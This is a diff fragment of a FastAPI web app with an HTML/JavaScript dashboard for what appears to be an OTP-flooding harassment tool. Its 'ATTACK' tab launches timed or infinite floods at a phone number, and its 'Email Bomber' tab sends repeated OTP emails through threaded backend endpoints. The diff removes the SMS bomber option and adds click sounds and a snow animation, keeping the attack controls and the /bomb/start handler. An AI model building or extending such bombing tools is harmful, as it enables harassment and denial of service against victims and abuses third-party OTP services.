IDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
         </source>
     </audio>
 
@@ -753,11 +784,11 @@ async def index():
                 </div>
             </div>
             <div class="flex items-center gap-3 flex-wrap">
-                <div class="toggle-premium" onclick="toggleTheme()" id="themeToggle">
+                <div class="toggle-premium" onclick="toggleTheme(); playClickSound();" id="themeToggle">
                     <span id="themeIcon">🌙</span>
                     <span class="text-gray-400">Mode</span>
                 </div>
-                <div class="toggle-premium" onclick="toggleSound()" id="soundToggle">
+                <div class="toggle-premium" onclick="toggleSound(); playClickSound();" id="soundToggle">
                     <span id="soundIcon">🔊</span>
                     <span class="text-gray-400">Sound</span>
                 </div>
@@ -773,11 +804,11 @@ async def index():
 
         <!-- Tabs with Bold Headers -->
         <div class="flex gap-1 mb-6 border-b border-white/5">
-            <button class="tab-btn active" data-tab="attack" onclick="switchTab('attack')">
+            <button class="tab-btn active" data-tab="attack" onclick="switchTab('attack'); playClickSound();">
                 <span class="text-blue-400 font-bold">🚀</span> ATTACK
             </button>
-            <button class="tab-btn" data-tab="bomber" onclick="switchTab('bomber')">
-                <span class="text-green-400 font-bold">💣</span> SMS/EMAIL BOMBER
+            <button class="tab-btn" data-tab="bomber" onclick="switchTab('bomber'); playClickSound();">
+                <span class="text-green-400 font-bold">✉️</span> EMAIL BOMBER
             </button>
         </div>
 
@@ -803,7 +834,7 @@ async def index():
                         
                         <div>
                             <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">⏱️ Attack Duration</label>
-                            <select id="timerDuration" class="select-premium">
+                            <select id="timerDuration" class="select-premium" onclick="playClickSound();">
                                 <option value="0">♾️ Infinite</option>
                                 <option value="10">10 Seconds</option>
                                 <option value="30">30 Seconds</option>
@@ -815,17 +846,17 @@ async def index():
                         </div>
                         
                         <div class="grid grid-cols-2 gap-3">
-                            <button onclick="startAttack()" id="startBtn"
+                            <button onclick="startAttack(); playClickSound();" id="startBtn"
                                     class="col-span-2 btn-premium py-4 text-sm flex items-center justify-center gap-2">
                                 <span>🚀</span> Launch Attack
                             </button>
-                            <button onclick="stopAttack()" id="stopBtn"
+                            <button onclick="stopAttack(); playClickSound();" id="stopBtn"
                                     class="col-span-2 hidden btn-premium btn-danger py-4 text-sm flex items-center justify-center gap-2">
                                 <span>🛑</span> Stop Attack
                             </button>
                         </div>
                         
-                        <button onclick="exportStats()" id="exportBtn"
+                        <button onclick="exportStats(); playClickSound();" id="exportBtn"
                                 class="w-full btn-ghost py-2.5 rounded-xl text-xs font-medium text-gray-400 transition-all flex items-center justify-center gap-2">
                             📊 Export Statistics
                         </button>
@@ -897,29 +928,18 @@ async def index():
             </div>
         </div>
 
-        <!-- Tab 2: Bomber -->
+        <!-- Tab 2: Email Bomber (SMS Removed) -->
         <div id="tab-bomber" class="tab-content">
             <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
                 <!-- Control Panel -->
                 <div class="lg:col-span-5 glass-premium rounded-2xl p-6">
-                    <div class="col-header col-header-green">💣 SMS/Email Bomber</div>
+                    <div class="col-header col-header-green">✉️ Email Bomber</div>
                     <div class="space-y-4 mt-4">
                         <div>
-                            <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">🎯 Target</label>
-                            <input id="bombTarget" class="input-premium" placeholder="+923001234567 or email@example.com">
-                        </div>
-                        <div>
-                            <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">📱 Method</label>
-                            <select id="bombMethod" class="select-premium" onchange="toggleEmailField()">
-                                <option value="phone">📱 SMS (Phone Number)</option>
-                                <option value="email">✉️ Email</option>
-                            </select>
-                        </div>
-                        <div id="emailField" style="display:none;">
-                            <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">✉️ Your Email (for receiving OTPs)</label>
+                            <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">✉️ Your Email</label>
                             <input id="bombEmail" class="input-premium" placeholder="your@email.com">
-                            <p class="text-[10px] text-yellow-400/60 mt-1">
-                                ⚠️ Check your email inbox and <strong class="text-yellow-400">SPAM FOLDER</strong> — 
+                            <p class="text-[10px] text-yellow-400/70 mt-1">
+                                ⚠️ <strong class="text-yellow-400">Check your email inbox and SPAM FOLDER</strong> — 
                                 OTP emails will arrive there!
                             </p>
                         </div>
@@ -932,11 +952,11 @@ async def index():
                             <input id="bombDelay" type="number" step="0.5" class="input-premium" placeholder="1" value="1" min="0.1">
                         </div>
                         <div class="grid grid-cols-2 gap-3">
-                            <button onclick="startBomb()" id="bombStartBtn"
+                            <button onclick="startBomb(); playClickSound();" id="bombStartBtn"
                                     class="col-span-2 btn-premium btn-success py-4 text-sm flex items-center justify-center gap-2">
-                                <span>💥</span> Start Bombing
+                                <span>💥</span> Start Email Bombing
                             </button>
-                            <button onclick="stopBomb()" id="bombStopBtn"
+                            <button onclick="stopBomb(); playClickSound();" id="bombStopBtn"
                                     class="col-span-2 hidden btn-premium btn-danger py-4 text-sm flex items-center justify-center gap-2">
                                 <span>🛑</span> Stop Bombing
                             </button>
@@ -972,9 +992,9 @@ async def index():
 
                 <!-- Stats -->
                 <div class="lg:col-span-7 glass-premium rounded-2xl p-6">
-                    <div class="col-header col-header-gold">📊 Bomb Stats</div>
+                    <div class="col-header col-header-gold">📊 Email Bomb Stats</div>
                     <div class="flex justify-between items-center mt-2">
-                        <span class="text-xs text-gray-500 font-mono" id="bombMethodDisplay">Method: SMS</span>
+                        <span class="text-xs text-gray-500 font-mono" id="bombMethodDisplay">Method: Email</span>
                     </div>
                     <div class="grid grid-cols-3 gap-3 mt-3">
                         <div class="stat-premium">
@@ -991,12 +1011,14 @@ async def index():
                         </div>
                     </div>
                     <div class="mt-4 p-3 bg-black/30 rounded-xl border border-white/5">
-                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">Target</div>
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">Target Email</div>
                         <div class="text-sm font-mono text-green-400 font-bold" id="bombTargetDisplay">—</div>
                     </div>
                     <div class="mt-3 p-3 bg-black/30 rounded-xl border border-white/5">
-                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">Email (for OTPs)</div>
-                        <div class="text-sm font-mono text-yellow-400 font-bold" id="bombEmailDisplay">—</div>
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">📧 Status</div>
+                        <div class="text-sm font-mono text-yellow-400 font-bold">
+                            ⚠️ Check your <strong>SPAM FOLDER</strong> for OTP emails!
+                        </div>
                     </div>
                 </div>
 
@@ -1033,6 +1055,43 @@ async def index():
         let timerInterval = null;
         let isLight = false;
         let bombInterval = null;
+        let snowTimeout = null;
+
+        // ===== CLICK SOUND =====
+        function playClickSound() {
+            if (!soundEnabled) return;
+            try {
+                const audio = document.getElementById('clickSound');
+                audio.currentTime = 0;
+                audio.play().catch(() => {});
+            } catch(e) {}
+        }
+
+        // ===== SNOW/SPRINKLE EFFECT =====
+        function triggerSnow() {
+            const container = document.getElementById('snowContainer');
+            container.innerHTML = '';
+            
+            const emojis = ['❄️', '✨', '⭐', '💫', '❄️', '✨', '⭐'];
+            const count = 60;
+            
+            for (let i = 0; i < count; i++) {
+                const flake = document.createElement('div');
+                flake.className = 'snowflake';
+                flake.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                flake.style.left = Math.random() * 100 + '%';
+                flake.style.fontSize = (0.6 + Math.random() * 1.5) + 'rem';
+                flake.style.animationDuration = (2 + Math.random() * 4) + 's';
+                flake.style.animationDelay = (Math.random() * 3) + 's';
+                container.appendChild(flake);
+            }
+            
+            // Auto remove after 5 seconds
+            if (snowTimeout) clearTimeout(snowTimeout);
+            snowTimeout = setTimeout(() => {
+                container.innerHTML = '';
+            }, 5000);
+        }
 
         // ===== TAB SWITCHING =====
         function switchTab(tab) {
@@ -1040,17 +1099,6 @@ async def index():
             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
             document.getElementById('tab-' + tab).classList.add('active');
             document.querySelector(`[data-tab="${tab}"]`).classList.add('active');
-        }
-
-        // ===== TOGGLE EMAIL FIELD =====
-        function toggleEmailField() {
-            const method = document.getElementById('bombMethod').value;
-            const emailField = document.getElementById('emailField');
-            if (method === 'email') {
-                emailField.style.display = 'block';
-            } else {
-                emailField.style.display = 'none';
-            }
         }
 
         // ===== THEME TOGGLE =====
@@ -1095,7 +1143,6 @@ async def index():
         }
         function playWrongSound() { playSound('wrongSound'); }
         function playAttackSound() { playSound('attackSound'); }
-        function playNiceSound() { playSound('niceSound'); }
 
         // ===== NUMBER VALIDATION =====
         let lastValidation = '';
@@ -1109,7 +1156,7 @@ async def index():
                 }
             } else if (value.length === 10) {
                 feedback.innerHTML = '<span class="text-emerald-400 text-xs">✅ Valid number</span>';
-                playNiceSound();
+                playClickSound();
             } else {
                 feedback.innerHTML = '';
             }
@@ -1146,7 +1193,7 @@ async def index():
             a.download = `attack_stats_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.json`;
             a.click();
             URL.revokeObjectURL(url);
-            playNiceSound();
+            playClickSound();
         }
 
         // ===== TIMESTAMP =====
@@ -1190,6 +1237,7 @@ async def index():
                 if (data.status === 'success') {
                     playAttackSound();
                     showHeartAnimation();
+                    triggerSnow();
                     isRunning = true;
                     document.getElementById('startBtn').classList.add('hidden');
                     document.getElementById('stopBtn').classList.remove('hidden');
@@ -1226,6 +1274,7 @@ async def index():
             try {
                 await fetch('/stop', {method: 'POST'});
                 isRunning = false;
+                triggerSnow();
                 document.getElementById('startBtn').classList.remove('hidden');
                 document.getElementById('stopBtn').classList.add('hidden');
                 document.getElementById('statusDot').className = 'dot-premium idle';
@@ -1285,30 +1334,18 @@ async def index():
             }, 1200);
         }
 
-        // ===== BOMBER FUNCTIONS =====
+        // ===== BOMBER FUNCTIONS (EMAIL ONLY) =====
         async function startBomb() {
-            const target = document.getElementById('bombTarget').value.trim();
-            const method = document.getElementById('bombMethod').value;
             const email = document.getElementById('bombEmail').value.trim();
             const count = parseInt(document.getElementById('bombCount').value) || 10;
             const delay = parseFloat(document.getElementById('bombDelay').value) || 1;
 
-            if (!target) {
-                alert('❌ Please enter a target (phone number or email)');
+            if (!email) {
+                alert('❌ Please enter your email address');
                 return;
             }
 
-            if (method === 'phone' && !target.match(/^\\+?[0-9]{10,15}$/)) {
-                alert('❌ Please enter a valid phone number with country code (e.g., +923001234567)');
-                return;
-            }
-
-            if (method === 'email' && !email) {
-                alert('❌ Please enter your email address to receive OTPs');
-                return;
-            }
-
-            if (method === 'email' && !email.match(/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/)) {
+            if (!email.match(/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/)) {
                 alert('❌ Please enter a valid email address');
                 return;
             }
@@ -1318,15 +1355,16 @@ async def index():
             document.getElementById('bombStatus').textContent = '⏳ Running...';
             document.getElementById('bombStatus').style.color = '#fbbf24';
 
-            document.getElementById('bombMethodDisplay').textContent = `Method: ${method === 'phone' ? '📱 SMS' : '✉️ Email'}`;
-            document.getElementById('bombTargetDisplay').textContent = target;
-            document.getElementById('bombEmailDisplay').textContent = method === 'email' ? email : '—';
+            document.getElementById('bombMethodDisplay').textContent = 'Method: Email';
+            document.getElementById('bombTargetDisplay').textContent = email;
+
+            triggerSnow();
 
             try {
                 const res = await fetch('/bomb/start', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({target, count, delay, method, email})
+                    body: JSON.stringify({target: email, count, delay, method: 'email', email})
                 });
                 const data = await res.json();
                 if (data.status === 'success') {
@@ -1344,6 +1382,7 @@ async def index():
                 document.getElementById('bombStopBtn').classList.add('hidden');
                 document.getElementById('bombStatus').textContent = '⏹️ Stopped';
                 document.getElementById('bombStatus').style.color = '#ef4444';
+                triggerSnow();
                 if (bombInterval) clearInterval(bombInterval);
             } catch(e) {
                 alert('❌ Failed: ' + e.message);
@@ -1400,8 +1439,7 @@ async def index():
             document.getElementById('apiCount').textContent = API_COUNT;
             document.getElementById('apiCountFooter').textContent = '⚡ ' + API_COUNT + ' APIs';
             document.getElementById('attackLogs').innerHTML = '<div class="text-gray-500 text-center py-6">🟢 System initialized · Ready for action</div>';
-            document.getElementById('bombLogs').innerHTML = '<div class="text-gray-500 text-center py-6">🟢 Bomber ready</div>';
-            toggleEmailField();
+            document.getElementById('bombLogs').innerHTML = '<div class="text-gray-500 text-center py-6">🟢 Email Bomber ready</div>';
         });
     </script>
 </body>
@@ -1438,7 +1476,7 @@ async def status():
         "logs": attack_status["logs"][:50]
     }
 
-# === BOMBER ENDPOINTS ===
+# === BOMBER ENDPOINTS (EMAIL ONLY) ===
 @app.post("/bomb/start")
 async def bomb_start(request: Request):
     try:
@@ -1446,13 +1484,13 @@ async def bomb_start(request: Request):
         target = body.get('target', '')
         count = body.get('count', 10)
         delay = body.get('delay', 1)
-        method = body.get('method', 'phone')
+        method = body.get('method', 'email')
         email = body.get('email', '')
         
         if bomb_status["running"]:
             return {"status": "error", "message": "Bombing already running"}
         
-        threading.Thread(target=lambda: asyncio.run(run_bomber(target, count, delay, method, email)), daemon=True).start()
+        threading.Thread(target=lambda: asyncio.run(run_bomber(email, count, delay)), daemon=True).start()
         return {"status": "success"}
     except Exception as e:
         return {"status": "error", "message": str(e)}
